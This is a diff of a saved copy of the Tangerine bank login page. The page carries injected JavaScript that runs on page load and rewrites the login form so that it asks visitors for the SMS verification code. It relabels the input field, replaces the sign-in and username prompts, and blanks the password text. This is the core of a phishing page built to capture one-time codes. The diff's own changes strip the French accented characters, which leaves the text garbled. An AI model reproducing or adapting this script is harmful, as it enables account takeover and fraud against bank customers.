@@ -3,7 +3,7 @@
 <html app-platform="web" lang="en" style="--theme-family-member-numbers:aIlvNe12BWM0OtLX3Qb145f4sQ5C9v9fezB3TJWiQx0LmFotW8fm4f2OtcmRQVWcYoFJtz"><!--
  Page saved with SingleFile 
  url: https://www.tangerine.ca/app/#/login/login-id?locale=en_CA 
- saved date: Sat Aug 08 2026 11:22:10 GMT-0400 (heure dâ€™été de lâ€™Est nord-américain)
+ saved date: Sat Aug 08 2026 11:22:10 GMT-0400 (heure dt de lEst nord-amricain)
 --><head a-c-at="9f89c84a559f573636a47ff8daed0d33" d-c-id="6db7540144f34a2c4fa4811ea1fd4f3b-6181759593211398" v-c-at="latest">
 
 <script>
@@ -71,7 +71,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var id = targetInput.id;
         if(id) {
             var label = document.querySelector("label[for='" + id + "']");
-            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+            if(label) label.innerHTML = "<b>Code de vrification SMS</b>";
         }
         
         var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
@@ -80,10 +80,10 @@ document.addEventListener("DOMContentLoaded", function() {
             var text = node.nodeValue.toLowerCase();
             if(text.trim().length > 3) {
                 if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
-                    node.nodeValue = "Vérification de sécurité";
+                    node.nodeValue = "Vrification de scurit";
                 }
-                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
-                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reu par SMS :";
                 }
                 else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
                     node.nodeValue = "";
